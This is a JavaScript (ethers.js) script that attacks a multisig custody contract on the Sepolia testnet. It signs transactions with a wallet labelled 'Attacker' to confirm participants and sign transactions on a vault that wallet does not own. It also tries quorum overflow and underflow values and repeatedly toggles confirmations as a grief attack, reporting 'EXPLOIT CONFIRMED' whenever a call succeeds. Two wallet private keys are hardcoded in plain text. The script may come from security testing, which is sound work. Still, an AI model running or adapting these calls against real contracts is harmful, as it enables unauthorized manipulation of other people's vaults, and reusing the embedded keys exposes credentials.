const { ethers } = require("ethers");

// === ADVANCED ATTACK VECTORS (Using Existing Vaults) ===

const RPC_URL = "https://ethereum-sepolia.publicnode.com";
const CUSTODY_ADDRESS = "0x815aeca64a974297942d2bbf034bd63eb638883d";
const WALLET1_PK = "0xa12f4dc456a8fa989f093604e702384f9691f99c3242f615fc9a1ba0d3b3eaf2";
const WALLET2_PK = "0x66703806999048d288011123372530e7e54a85f56cb80397a59c5d6e2911c3a4";

const EXISTING_VAULT = "0x5465737431373636363632323539303235000000000000000000000000000000";

const ABI = [
    "function confirmParticipant(bytes32 _creator, bytes32 _participant, bool _confirmation) external",
    "function signTransaction(bytes32 _creator, bytes32 _participant, uint256 _tx) external",
    "function defineQuorum(bytes32 _creator, uint256 _minParticipants) external",
    "function getQuorum(bytes32 _creator) external view returns (uint256)"
];

async function run() {
    console.log("=== HUNTING FOR MORE VULNERABILITIES ===\n");

    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
    const wallet1 = new ethers.Wallet(WALLET1_PK, provider);
    const wallet2 = new ethers.Wallet(WALLET2_PK, provider);

    const contract1 = new ethers.Contract(CUSTODY_ADDRESS, ABI, wallet1);
    const contract2 = new ethers.Contract(CUSTODY_ADDRESS, ABI, wallet2);

    console.log(`Wallet 1 (Owner): ${wallet1.address}`);
    console.log(`Wallet 2 (Attacker): ${wallet2.address}`);
    console.log(`Testing Vault: ${EXISTING_VAULT.substring(0, 20)}...\n`);

    // TEST 1: Can non-owner confirm participants?
    console.log("TEST 1: Cross-Account Participant Confirmation");
    console.log("=".repeat(70));
    const randomParticipant = ethers.utils.formatBytes32String("RandomGuy");

    try {
        // Wallet2 (non-owner) tries to confirm a participant
        const tx1 = await contract2.confirmParticipant(
            EXISTING_VAULT,
            randomParticipant,
            true,
            { gasLimit: 500000 }
        );
        const r1 = await tx1.wait();
        console.log(`EXPLOIT CONFIRMED: Non-owner confirmed participants.`);
        console.log(`Transaction: ${r1.transactionHash}\n`);
    } catch (e) {
        console.log(`Protected: ${e.reason || e.message}\n`);
    }

    // TEST 2: Can we sign transactions for other people's vaults?
    console.log("TEST 2: Cross-Vault Transaction Signing");
    console.log("=".repeat(70));

    try {
        const tx2 = await contract2.signTransaction(
            EXISTING_VAULT,
            randomParticipant,
            0,
            { gasLimit: 500000 }
        );
        const r2 = await tx2.wait();
        console.log(`EXPLOIT CONFIRMED: Signed transaction on another vault.`);
        console.log(`Transaction: ${r2.transactionHash}\n`);
    } catch (e) {
        console.log(`Protected: ${e.reason || e.message}\n`);
    }

    // TEST 3: Quorum integer overflow
    console.log("TEST 3: Quorum Integer Overflow");
    console.log("=".repeat(70));
    const MAX_UINT256 = ethers.BigNumber.from("2").pow(256).sub(1);

    try {
        await contract1.callStatic.defineQuorum(EXISTING_VAULT, MAX_UINT256);
        console.log(`EXPLOIT CONFIRMED: Set quorum to MAX_UINT256.`);
        console.log(`Impact: Impossible to ever reach consensus.\n`);
    } catch (e) {
        console.log(`Protected: ${e.reason || e.message}\n`);
    }

    // TEST 4: Negative quorum (underflow)
    console.log("TEST 4: Quorum Underflow Test");
    console.log("=".repeat(70));

    try {
        // Try to set quorum to -1 (which wraps to MAX_UINT256 in Solidity)
        await contract1.callStatic.defineQuorum(EXISTING_VAULT, -1);
        console.log(`EXPLOIT CONFIRMED: Negative quorum accepted.\n`);
    } catch (e) {
        console.log(`Protected: ${e.reason || "Negative values blocked"}\n`);
    }

    // TEST 5: Can we re-confirm the same participant multiple times?
    console.log("TEST 5: Repeated Confirmation Attack");
    console.log("=".repeat(70));

    try {
        const participant = ethers.utils.formatBytes32String("TestP");

        // First confirmation
        const tx3 = await contract1.confirmParticipant(
            EXISTING_VAULT,
            participant,
            true,
            { gasLimit: 500000 }
        );
        await tx3.wait();
        console.log("First confirmation succeeded.");

        // Second confirmation (should this be allowed?)
        const tx4 = await contract1.confirmParticipant(
            EXISTING_VAULT,
            participant,
            false,
            { gasLimit: 500000 }
        );
        const r4 = await tx4.wait();
        console.log(`Second confirmation succeeded (toggled): ${r4.transactionHash}`);

        // Third confirmation
        const tx5 = await contract1.confirmParticipant(
            EXISTING_VAULT,
            participant,
            true,
            { gasLimit: 500000 }
        );
        const r5 = await tx5.wait();
        console.log(`Third confirmation succeeded (re-toggled): ${r5.transactionHash}`);

        console.log(`\nPotential Exploit: Confirmation can be toggled infinitely.`);
        console.log(`Impact: Grief attack, state manipulation.\n`);

    } catch (e) {
        console.log(`Protected: ${e.reason || e.message}\n`);
    }
}

run().catch(console.error);
